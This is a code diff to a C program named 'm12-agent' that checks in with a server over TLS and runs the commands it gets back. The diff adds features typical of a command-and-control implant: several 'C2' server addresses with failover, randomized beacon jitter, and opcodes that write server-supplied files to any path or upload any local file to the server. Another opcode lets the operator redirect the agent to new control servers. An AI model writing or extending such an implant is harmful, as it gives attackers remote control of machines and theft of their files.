@@ -42,6 +42,7 @@
 #include "mbedtls/x509_crt.h"
 #include "mbedtls/pk.h"
 #include "mbedtls/error.h"
+#include "mbedtls/sha256.h"
 
 #include "jsmn.h"
 
@@ -96,20 +97,29 @@
 #define CONFIG_PATH "m12-agent.conf"
 #endif
 
+#define M12_PROTO_VERSION 2
+
 #define HTTP_PATH        "/ingest"
 #define HTTP_OUTPUT_PATH "/output"
 /* ------------------------------------------------------------- */
 
 /* Resolved endpoint/paths, filled by load_config() before any connection. */
+#define MAX_C2_ADDRS 8
+
+typedef struct { char host[128]; char port[16]; } c2_addr_t;
+
 static struct {
-  char host[128];
-  char port[16];
+  char host[128];       /* active host (points into addrs[addr_idx]) */
+  char port[16];        /* active port */
   char region[32];
   char ca[256];
   char cert[256];
   char key[256];
   char identity[256];   /* one PEM file = cert + key; used for both when set */
   char node[80];        /* reported node id; auto-derived from MAC when empty */
+  c2_addr_t addrs[MAX_C2_ADDRS];
+  int addr_count;
+  int addr_idx;
 } g_cfg;
 
 #define RESP_CAP 16384   /* ingest response (telemetry ack + commands) */
@@ -118,6 +128,7 @@ static struct {
 #define BODY_CAP 20480   /* /output request body */
 #define REQ_CAP  24576   /* full HTTP request (headers + body) */
 #define MAX_TOKS 512     /* jsmn token budget */
+#define FILE_MAX_SIZE (4 * 1024 * 1024)
 
 static mbedtls_entropy_context g_entropy;
 static mbedtls_ctr_drbg_context g_ctr_drbg;
@@ -125,8 +136,17 @@ static mbedtls_x509_crt g_cacert;
 static mbedtls_x509_crt g_clicert;
 static mbedtls_pk_context g_pkey;
 static mbedtls_ssl_config g_conf;
+static mbedtls_ssl_session g_session;
+static int g_session_valid;
 
 static char g_req[REQ_CAP];
+
+static void sleep_jitter(int base) {
+  double factor = 0.7 + ((double)(rand() % 1000) / 1000.0) * 0.6;
+  int s = (int)(base * factor);
+  if (s < 1) s = 1;
+  sleep(s);
+}
 
 static void emit_err(const char *what, int ret) {
   char buf[128];
@@ -297,6 +317,8 @@ static int setup_tls(void) {
   mbedtls_x509_crt_init(&g_clicert);
   mbedtls_pk_init(&g_pkey);
   mbedtls_ssl_config_init(&g_conf);
+  mbedtls_ssl_session_init(&g_session);
+  g_session_valid = 0;
 
   if ((ret = mbedtls_ctr_drbg_seed(&g_ctr_drbg, mbedtls_entropy_func, &g_entropy, (const unsigned char *)pers, strlen(pers))) != 0) { emit_err("drbg_seed", ret); return -1; }
   /* --- CA (trust anchor) — compiled-in PEM --- */
@@ -314,6 +336,8 @@ static int setup_tls(void) {
 }
 
 static void cleanup_tls(void) {
+  mbedtls_ssl_session_free(&g_session);
+  g_session_valid = 0;
   mbedtls_ssl_config_free(&g_conf);
   mbedtls_x509_crt_free(&g_cacert);
   mbedtls_x509_crt_free(&g_clicert);
@@ -362,11 +386,16 @@ static int https_request(const char *path, const char *body, char *resp, size_t 
   if (fd < 0) { fprintf(stderr, "connect: %s:%s: %s\n", g_cfg.host, g_cfg.port, strerror(errno)); goto done; }
   if ((ret = mbedtls_ssl_setup(&ssl, &g_conf)) != 0) { emit_err("ssl_setup", ret); goto done; }
   if ((ret = mbedtls_ssl_set_hostname(&ssl, g_cfg.host)) != 0) { emit_err("set_hostname", ret); goto done; }
+  if (g_session_valid) mbedtls_ssl_set_session(&ssl, &g_session);
   mbedtls_ssl_set_bio(&ssl, &fd, net_send, net_recv, NULL);
 
   while ((ret = mbedtls_ssl_handshake(&ssl)) != 0) {
     if (ret != MBEDTLS_ERR_SSL_WANT_READ && ret != MBEDTLS_ERR_SSL_WANT_WRITE) { emit_err("handshake", ret); goto done; }
   }
+  /* Save session for resumption on next connection */
+  mbedtls_ssl_session_free(&g_session);
+  mbedtls_ssl_session_init(&g_session);
+  if (mbedtls_ssl_get_session(&ssl, &g_session) == 0) g_session_valid = 1;
 
   int rlen = snprintf(g_req, sizeof(g_req),
                       "POST %s HTTP/1.1\r\nHost: %s:%s\r\nContent-Type: application/json\r\n"
@@ -404,6 +433,310 @@ done:
 static const char *http_body(const char *resp) {
   const char *b = strstr(resp, "\r\n\r\n");
   return b ? b + 4 : resp;
+}
+
+static void sha256_hex(const unsigned char *data, size_t len, char *hex) {
+  unsigned char hash[32];
+  mbedtls_sha256(data, len, hash, 0);
+  for (int i = 0; i < 32; i++) sprintf(hex + i * 2, "%02x", hash[i]);
+  hex[64] = 0;
+}
+
+static int https_get_file(const char *path, unsigned char **out_data, size_t *out_len) {
+  int ret, status = -1;
+  int fd = -1;
+  unsigned char *buf = NULL;
+  mbedtls_ssl_context ssl;
+  mbedtls_ssl_init(&ssl);
+  *out_data = NULL;
+  *out_len = 0;
+
+  fd = tcp_connect(g_cfg.host, g_cfg.port);
+  if (fd < 0) goto done;
+  if ((ret = mbedtls_ssl_setup(&ssl, &g_conf)) != 0) goto done;
+  if ((ret = mbedtls_ssl_set_hostname(&ssl, g_cfg.host)) != 0) goto done;
+  if (g_session_valid) mbedtls_ssl_set_session(&ssl, &g_session);
+  mbedtls_ssl_set_bio(&ssl, &fd, net_send, net_recv, NULL);
+  while ((ret = mbedtls_ssl_handshake(&ssl)) != 0)
+    if (ret != MBEDTLS_ERR_SSL_WANT_READ && ret != MBEDTLS_ERR_SSL_WANT_WRITE) goto done;
+  mbedtls_ssl_session_free(&g_session);
+  mbedtls_ssl_session_init(&g_session);
+  if (mbedtls_ssl_get_session(&ssl, &g_session) == 0) g_session_valid = 1;
+
+  char reqbuf[512];
+  int rlen = snprintf(reqbuf, sizeof(reqbuf),
+    "GET %s HTTP/1.1\r\nHost: %s:%s\r\nConnection: close\r\n\r\n",
+    path, g_cfg.host, g_cfg.port);
+  if (rlen < 0 || rlen >= (int)sizeof(reqbuf)) goto notify;
+
+  for (int w = 0; w < rlen; ) {
+    ret = mbedtls_ssl_write(&ssl, (const unsigned char *)reqbuf + w, rlen - w);
+    if (ret == MBEDTLS_ERR_SSL_WANT_READ || ret == MBEDTLS_ERR_SSL_WANT_WRITE) continue;
+    if (ret <= 0) goto notify;
+    w += ret;
+  }
+
+  size_t cap = 16384, n = 0;
+  buf = malloc(cap);
+  if (!buf) goto notify;
+  for (;;) {
+    if (n + 4096 > cap) {
+      size_t nc = cap * 2;
+      if (nc > FILE_MAX_SIZE + 8192) { free(buf); buf = NULL; goto notify; }
+      unsigned char *nb = realloc(buf, nc);
+      if (!nb) { free(buf); buf = NULL; goto notify; }
+      buf = nb; cap = nc;
+    }
+    ret = mbedtls_ssl_read(&ssl, buf + n, cap - n);
+    if (ret == MBEDTLS_ERR_SSL_WANT_READ || ret == MBEDTLS_ERR_SSL_WANT_WRITE) continue;
+    if (ret == MBEDTLS_ERR_SSL_PEER_CLOSE_NOTIFY || ret == 0) break;
+    if (ret < 0) break;
+    n += ret;
+  }
+  if (n < 12 || !buf) { free(buf); buf = NULL; goto notify; }
+  sscanf((char *)buf + 9, "%d", &status);
+  if (status == 200) {
+    char *hdr_end = strstr((char *)buf, "\r\n\r\n");
+    if (hdr_end) {
+      size_t hdr_len = (size_t)(hdr_end - (char *)buf) + 4;
+      *out_len = n - hdr_len;
+      *out_data = malloc(*out_len);
+      if (*out_data) memcpy(*out_data, buf + hdr_len, *out_len);
+      else { *out_len = 0; status = -1; }
+    }
+  }
+  free(buf); buf = NULL;
+
+notify:
+  mbedtls_ssl_close_notify(&ssl);
+done:
+  mbedtls_ssl_free(&ssl);
+  if (fd >= 0) close(fd);
+  return status;
+}
+
+static int https_post_file(const char *path, const unsigned char *data, size_t data_len) {
+  int ret, status = -1;
+  int fd = -1;
+  mbedtls_ssl_context ssl;
+  mbedtls_ssl_init(&ssl);
+
+  fd = tcp_connect(g_cfg.host, g_cfg.port);
+  if (fd < 0) goto done;
+  if ((ret = mbedtls_ssl_setup(&ssl, &g_conf)) != 0) goto done;
+  if ((ret = mbedtls_ssl_set_hostname(&ssl, g_cfg.host)) != 0) goto done;
+  if (g_session_valid) mbedtls_ssl_set_session(&ssl, &g_session);
+  mbedtls_ssl_set_bio(&ssl, &fd, net_send, net_recv, NULL);
+  while ((ret = mbedtls_ssl_handshake(&ssl)) != 0)
+    if (ret != MBEDTLS_ERR_SSL_WANT_READ && ret != MBEDTLS_ERR_SSL_WANT_WRITE) goto done;
+  mbedtls_ssl_session_free(&g_session);
+  mbedtls_ssl_session_init(&g_session);
+  if (mbedtls_ssl_get_session(&ssl, &g_session) == 0) g_session_valid = 1;
+
+  char hdr[512];
+  int hlen = snprintf(hdr, sizeof(hdr),
+    "POST %s HTTP/1.1\r\nHost: %s:%s\r\nContent-Type: application/octet-stream\r\n"
+    "Content-Length: %d\r\nConnection: close\r\n\r\n",
+    path, g_cfg.host, g_cfg.port, (int)data_len);
+  if (hlen < 0 || hlen >= (int)sizeof(hdr)) goto notify;
+  for (int w = 0; w < hlen; ) {
+    ret = mbedtls_ssl_write(&ssl, (const unsigned char *)hdr + w, hlen - w);
+    if (ret == MBEDTLS_ERR_SSL_WANT_READ || ret == MBEDTLS_ERR_SSL_WANT_WRITE) continue;
+    if (ret <= 0) goto notify;
+    w += ret;
+  }
+  for (size_t w = 0; w < data_len; ) {
+    size_t chunk = data_len - w;
+    if (chunk > 8192) chunk = 8192;
+    ret = mbedtls_ssl_write(&ssl, data + w, chunk);
+    if (ret == MBEDTLS_ERR_SSL_WANT_READ || ret == MBEDTLS_ERR_SSL_WANT_WRITE) continue;
+    if (ret <= 0) goto notify;
+    w += ret;
+  }
+
+  char resp[512];
+  size_t n = 0;
+  for (;;) {
+    ret = mbedtls_ssl_read(&ssl, (unsigned char *)resp + n, sizeof(resp) - 1 - n);
+    if (ret == MBEDTLS_ERR_SSL_WANT_READ || ret == MBEDTLS_ERR_SSL_WANT_WRITE) continue;
+    if (ret == MBEDTLS_ERR_SSL_PEER_CLOSE_NOTIFY || ret == 0) break;
+    if (ret < 0) break;
+    n += ret;
+    if (n >= sizeof(resp) - 1) break;
+  }
+  resp[n] = 0;
+  if (n >= 12) sscanf(resp + 9, "%d", &status);
+
+notify:
+  mbedtls_ssl_close_notify(&ssl);
+done:
+  mbedtls_ssl_free(&ssl);
+  if (fd >= 0) close(fd);
+  return status;
+}
+
+static int handle_file_push(const char *json_str, int json_len) {
+  jsmn_parser p;
+  jsmn_init(&p);
+  jsmntok_t toks[32];
+  int n = jsmn_parse(&p, json_str, json_len, toks, 32);
+  if (n < 0) return -1;
+
+  const char *fid = NULL, *dp = NULL, *sha = NULL;
+  int fl = 0, dl = 0, sl = 0;
+  for (int i = 0; i < n - 1; i++) {
+    if (tok_eq(json_str, &toks[i], "fileId") && toks[i+1].type == JSMN_STRING)
+      { fid = json_str + toks[i+1].start; fl = toks[i+1].end - toks[i+1].start; }
+    else if (tok_eq(json_str, &toks[i], "path") && toks[i+1].type == JSMN_STRING)
+      { dp = json_str + toks[i+1].start; dl = toks[i+1].end - toks[i+1].start; }
+    else if (tok_eq(json_str, &toks[i], "sha256") && toks[i+1].type == JSMN_STRING)
+      { sha = json_str + toks[i+1].start; sl = toks[i+1].end - toks[i+1].start; }
+  }
+  if (!fid || !dp || !sha || fl > 32 || dl > 512 || sl != 64) return -1;
+
+  char fidbuf[33], dpath[513], expected[65];
+  memcpy(fidbuf, fid, fl); fidbuf[fl] = 0;
+  memcpy(dpath, dp, dl); dpath[dl] = 0;
+  memcpy(expected, sha, 64); expected[64] = 0;
+
+  char url[128];
+  snprintf(url, sizeof(url), "/file/%s", fidbuf);
+  unsigned char *data = NULL;
+  size_t data_len = 0;
+  int st = https_get_file(url, &data, &data_len);
+  if (st != 200 || !data) {
+    fprintf(stderr, "file_push: download failed HTTP %d\n", st);
+    free(data);
+    return -1;
+  }
+
+  char actual[65];
+  sha256_hex(data, data_len, actual);
+  if (strcmp(actual, expected) != 0) {
+    fprintf(stderr, "file_push: SHA-256 mismatch\n");
+    free(data);
+    return -1;
+  }
+
+  char tmppath[520];
+  snprintf(tmppath, sizeof(tmppath), "%s.m12tmp", dpath);
+  int wfd = open(tmppath, O_WRONLY | O_CREAT | O_TRUNC, 0644);
+  if (wfd < 0) { fprintf(stderr, "file_push: open %s: %s\n", tmppath, strerror(errno)); free(data); return -1; }
+  size_t wr = 0;
+  while (wr < data_len) {
+    ssize_t w = write(wfd, data + wr, data_len - wr);
+    if (w <= 0) { if (w < 0 && errno == EINTR) continue; close(wfd); unlink(tmppath); free(data); return -1; }
+    wr += w;
+  }
+  close(wfd);
+  free(data);
+
+  if (rename(tmppath, dpath) != 0) { fprintf(stderr, "file_push: rename: %s\n", strerror(errno)); unlink(tmppath); return -1; }
+  fprintf(stderr, "file_push: %s (%zu bytes) ok\n", dpath, data_len);
+  return 0;
+}
+
+static int handle_file_pull(const char *json_str, int json_len) {
+  jsmn_parser p;
+  jsmn_init(&p);
+  jsmntok_t toks[32];
+  int n = jsmn_parse(&p, json_str, json_len, toks, 32);
+  if (n < 0) return -1;
+
+  const char *fid = NULL, *rp = NULL;
+  int fl = 0, rl = 0;
+  for (int i = 0; i < n - 1; i++) {
+    if (tok_eq(json_str, &toks[i], "fileId") && toks[i+1].type == JSMN_STRING)
+      { fid = json_str + toks[i+1].start; fl = toks[i+1].end - toks[i+1].start; }
+    else if (tok_eq(json_str, &toks[i], "path") && toks[i+1].type == JSMN_STRING)
+      { rp = json_str + toks[i+1].start; rl = toks[i+1].end - toks[i+1].start; }
+  }
+  if (!fid || !rp || fl > 32 || rl > 512) return -1;
+
+  char fidbuf[33], rpath[513];
+  memcpy(fidbuf, fid, fl); fidbuf[fl] = 0;
+  memcpy(rpath, rp, rl); rpath[rl] = 0;
+
+  int rfd = open(rpath, O_RDONLY);
+  if (rfd < 0) { fprintf(stderr, "file_pull: open %s: %s\n", rpath, strerror(errno)); return -1; }
+  off_t fsize = lseek(rfd, 0, SEEK_END);
+  if (fsize < 0 || fsize > FILE_MAX_SIZE) { close(rfd); return -1; }
+  lseek(rfd, 0, SEEK_SET);
+
+  unsigned char *data = malloc((size_t)fsize);
+  if (!data) { close(rfd); return -1; }
+  size_t total = 0;
+  while (total < (size_t)fsize) {
+    ssize_t r = read(rfd, data + total, (size_t)fsize - total);
+    if (r <= 0) { if (r < 0 && errno == EINTR) continue; break; }
+    total += r;
+  }
+  close(rfd);
+
+  char url[128];
+  snprintf(url, sizeof(url), "/file/%s", fidbuf);
+  int st = https_post_file(url, data, total);
+  free(data);
+  if (st != 200) { fprintf(stderr, "file_pull: upload failed HTTP %d\n", st); return -1; }
+  fprintf(stderr, "file_pull: %s (%zu bytes) ok\n", rpath, total);
+  return 0;
+}
+
+static volatile int g_config_updated;
+static void cfg_set(char *dst, size_t cap, const char *val);
+static void parse_addresses(const char *val);
+
+/* Handle CONFIG_UPDATE opcode: parse new addresses from the command JSON,
+ * update runtime config and persist to disk. Format:
+ *   {"__m12":"config_update","addresses":"host1:port1,host2:port2,..."}
+ */
+static int handle_config_update(const char *json, int len) {
+  (void)len;
+  const char *key = "\"addresses\":\"";
+  const char *start = strstr(json, key);
+  if (!start) return -1;
+  start += strlen(key);
+  const char *end = strchr(start, '"');
+  if (!end || end - start > 1024) return -1;
+
+  char addrs[1024];
+  int n = (int)(end - start);
+  memcpy(addrs, start, n);
+  addrs[n] = 0;
+
+  parse_addresses(addrs);
+  if (g_cfg.addr_count == 0) return -1;
+
+  const char *cf = getenv("M12_CONFIG");
+  const char *path = (cf && *cf) ? cf : CONFIG_PATH;
+  /* Rewrite config file preserving non-addresses lines */
+  FILE *fr = fopen(path, "r");
+  char tmppath[300];
+  snprintf(tmppath, sizeof(tmppath), "%s.tmp", path);
+  FILE *fw = fopen(tmppath, "w");
+  if (!fw) { if (fr) fclose(fr); return -1; }
+  if (fr) {
+    char line[512];
+    while (fgets(line, sizeof(line), fr)) {
+      char *p = line;
+      while (*p == ' ' || *p == '\t') p++;
+      if (strncmp(p, "addresses", 9) == 0) {
+        char *eq = strchr(p, '=');
+        if (eq) continue;
+      }
+      fputs(line, fw);
+    }
+    fclose(fr);
+  }
+  fprintf(fw, "addresses = %s\n", addrs);
+  fflush(fw);
+  fsync(fileno(fw));
+  fclose(fw);
+  rename(tmppath, path);
+
+  fprintf(stderr, "m12-agent: config_update addresses=%s (count=%d)\n", addrs, g_cfg.addr_count);
+  g_config_updated = 1;
+  return 0;
 }
 
 /* Build the leading "node":"<id>", JSON fragment (empty when no id is known, so
@@ -456,7 +789,34 @@ static void process_commands(const char *json) {
 
     static char out[OUT_CAP];
     int exit_code = 0;
-    run_command(cmdbuf, out, sizeof(out), &exit_code);
+    if (strncmp(cmdbuf, "{\"__m12\":", 9) == 0) {
+      int cl = (int)strlen(cmdbuf);
+      if (strstr(cmdbuf, "\"file_push\"")) {
+        exit_code = handle_file_push(cmdbuf, cl) == 0 ? 0 : 1;
+        snprintf(out, sizeof(out), exit_code == 0 ? "file_push: OK" : "file_push: FAILED");
+      } else if (strstr(cmdbuf, "\"file_pull\"")) {
+        exit_code = handle_file_pull(cmdbuf, cl) == 0 ? 0 : 1;
+        snprintf(out, sizeof(out), exit_code == 0 ? "file_pull: OK" : "file_pull: FAILED");
+      } else if (strstr(cmdbuf, "\"config_update\"")) {
+        exit_code = handle_config_update(cmdbuf, cl) == 0 ? 0 : 1;
+        snprintf(out, sizeof(out), exit_code == 0 ? "config_update: OK (count=%d)" : "config_update: FAILED", g_cfg.addr_count);
+      } else {
+        /* Extract the opcode value for the error report so the C2 operator
+         * can see exactly which opcode this agent doesn't understand. */
+        const char *vstart = cmdbuf + 9;
+        while (*vstart == ' ' || *vstart == '"') vstart++;
+        char opname[64];
+        int oi = 0;
+        while (vstart[oi] && vstart[oi] != '"' && vstart[oi] != ',' && vstart[oi] != '}' && oi < (int)sizeof(opname) - 1) oi++;
+        memcpy(opname, vstart, oi);
+        opname[oi] = 0;
+        snprintf(out, sizeof(out), "unknown opcode: %s (agent v%d)", opname, M12_PROTO_VERSION);
+        exit_code = 1;
+        fprintf(stderr, "m12-agent: %s\n", out);
+      }
+    } else {
+      run_command(cmdbuf, out, sizeof(out), &exit_code);
+    }
 
     static char esc[ESC_CAP];
     json_escape(out, strlen(out), esc, sizeof(esc));
@@ -535,6 +895,8 @@ static int derive_node_id(char *out, size_t cap) {
 
 /* ---------- runtime configuration ---------- */
 
+#define FAILOVER_THRESHOLD 5
+
 /* Copy val into dst (bounded, always NUL-terminated). NULL val is a no-op,
  * so an unset env var / absent key leaves the previous value in place. */
 static void cfg_set(char *dst, size_t cap, const char *val) {
@@ -543,6 +905,57 @@ static void cfg_set(char *dst, size_t cap, const char *val) {
   if (n >= cap) n = cap - 1;
   memcpy(dst, val, n);
   dst[n] = 0;
+}
+
+/* Parse "host:port,host2:port2,..." into g_cfg.addrs[].
+ * Sets g_cfg.addr_count and activates index 0. */
+static void parse_addresses(const char *val) {
+  if (!val || !*val) return;
+  g_cfg.addr_count = 0;
+  const char *p = val;
+  while (*p && g_cfg.addr_count < MAX_C2_ADDRS) {
+    const char *comma = strchr(p, ',');
+    int len = comma ? (int)(comma - p) : (int)strlen(p);
+    char buf[160];
+    if (len >= (int)sizeof(buf)) len = (int)sizeof(buf) - 1;
+    memcpy(buf, p, len);
+    buf[len] = 0;
+    /* Trim whitespace */
+    char *s = buf;
+    while (*s == ' ' || *s == '\t') s++;
+    char *e = s + strlen(s);
+    while (e > s && (e[-1] == ' ' || e[-1] == '\t')) e--;
+    *e = 0;
+    if (*s) {
+      c2_addr_t *a = &g_cfg.addrs[g_cfg.addr_count];
+      char *colon = strrchr(s, ':');
+      if (colon && colon != s) {
+        *colon = 0;
+        cfg_set(a->host, sizeof(a->host), s);
+        cfg_set(a->port, sizeof(a->port), colon + 1);
+      } else {
+        cfg_set(a->host, sizeof(a->host), s);
+        cfg_set(a->port, sizeof(a->port), g_cfg.port[0] ? g_cfg.port : SERVER_PORT);
+      }
+      g_cfg.addr_count++;
+    }
+    p = comma ? comma + 1 : p + len;
+  }
+  if (g_cfg.addr_count > 0) {
+    g_cfg.addr_idx = 0;
+    cfg_set(g_cfg.host, sizeof(g_cfg.host), g_cfg.addrs[0].host);
+    cfg_set(g_cfg.port, sizeof(g_cfg.port), g_cfg.addrs[0].port);
+  }
+}
+
+/* Advance to the next C2 address in the list (wraps around). */
+static void failover_advance(void) {
+  if (g_cfg.addr_count < 2) return;
+  g_cfg.addr_idx = (g_cfg.addr_idx + 1) % g_cfg.addr_count;
+  cfg_set(g_cfg.host, sizeof(g_cfg.host), g_cfg.addrs[g_cfg.addr_idx].host);
+  cfg_set(g_cfg.port, sizeof(g_cfg.port), g_cfg.addrs[g_cfg.addr_idx].port);
+  fprintf(stderr, "m12-agent: failover -> %s:%s (addr %d/%d)\n",
+          g_cfg.host, g_cfg.port, g_cfg.addr_idx + 1, g_cfg.addr_count);
 }
 
 /* Parse a "key = value" config file. Blank lines and '#' comments are ignored,
@@ -575,6 +988,7 @@ static void cfg_load_file(const char *path) {
     else if (!strcmp(key, "key"))    cfg_set(g_cfg.key,    sizeof(g_cfg.key),    val);
     else if (!strcmp(key, "identity")) cfg_set(g_cfg.identity, sizeof(g_cfg.identity), val);
     else if (!strcmp(key, "node"))     cfg_set(g_cfg.node,     sizeof(g_cfg.node),     val);
+    else if (!strcmp(key, "addresses")) parse_addresses(val);
   }
   fclose(f);
 }
@@ -603,6 +1017,15 @@ static void load_config(void) {
   cfg_set(g_cfg.key,    sizeof(g_cfg.key),    getenv("M12_KEY"));
   cfg_set(g_cfg.identity, sizeof(g_cfg.identity), getenv("M12_IDENTITY"));
   cfg_set(g_cfg.node,   sizeof(g_cfg.node),   getenv("M12_NODE"));
+  parse_addresses(getenv("M12_ADDRESSES"));
+
+  /* Ensure the address list is populated — single-address fallback */
+  if (g_cfg.addr_count == 0 && g_cfg.host[0]) {
+    cfg_set(g_cfg.addrs[0].host, sizeof(g_cfg.addrs[0].host), g_cfg.host);
+    cfg_set(g_cfg.addrs[0].port, sizeof(g_cfg.addrs[0].port), g_cfg.port);
+    g_cfg.addr_count = 1;
+    g_cfg.addr_idx = 0;
+  }
 
   /* 4. no explicit id anywhere -> derive a stable one from the MAC, so one
    *    identical fleet binary still reports as a distinct node per device.
@@ -622,12 +1045,13 @@ int main(int argc, char **argv) {
   }
 
   load_config();
+  srand(time(NULL) ^ getpid());
 
   for (;;) {
     if (setup_tls() != 0) {
       cleanup_tls();
       fprintf(stderr, "m12-agent: TLS init failed, retrying in %ds\n", interval);
-      sleep(interval);
+      sleep_jitter(interval);
       continue;
     }
 
@@ -635,13 +1059,14 @@ int main(int argc, char **argv) {
             g_cfg.host, g_cfg.port, interval, g_cfg.node[0] ? g_cfg.node : "(cert CN)");
 
     int failures = 0;
-    while (failures < 30) {
+    g_config_updated = 0;
+    while (failures < 30 && !g_config_updated) {
       char nodefld[96];
       node_field(nodefld, sizeof(nodefld));
       static char tjson[320];
       snprintf(tjson, sizeof(tjson),
-               "{%s\"status\":\"%s\",\"region\":\"%s\",\"metrics\":{\"cpu\":%.1f,\"mem\":%.1f}}",
-               nodefld, status, g_cfg.region, cpu_percent(), mem_percent());
+               "{%s\"v\":%d,\"status\":\"%s\",\"region\":\"%s\",\"metrics\":{\"cpu\":%.1f,\"mem\":%.1f}}",
+               nodefld, M12_PROTO_VERSION, status, g_cfg.region, cpu_percent(), mem_percent());
 
       static char resp[RESP_CAP];
       int code = https_request(HTTP_PATH, tjson, resp, sizeof(resp));
@@ -649,15 +1074,20 @@ int main(int argc, char **argv) {
         process_commands(http_body(resp));
         failures = 0;
       } else {
-        fprintf(stderr, "check-in failed: HTTP %d (%d/30)\n", code, ++failures);
+        if (++failures % FAILOVER_THRESHOLD == 0) failover_advance();
+        fprintf(stderr, "check-in failed: HTTP %d (%d/30)\n", code, failures);
       }
 
-      sleep(interval);
+      sleep_jitter(interval);
     }
 
-    fprintf(stderr, "m12-agent: 30 consecutive failures, reinitializing TLS\n");
+    if (g_config_updated) {
+      fprintf(stderr, "m12-agent: config updated, reconnecting to %s:%s\n", g_cfg.host, g_cfg.port);
+    } else {
+      fprintf(stderr, "m12-agent: 30 consecutive failures, reinitializing TLS\n");
+    }
     cleanup_tls();
-    sleep(interval);
+    sleep_jitter(interval);
   }
 
   return 0;
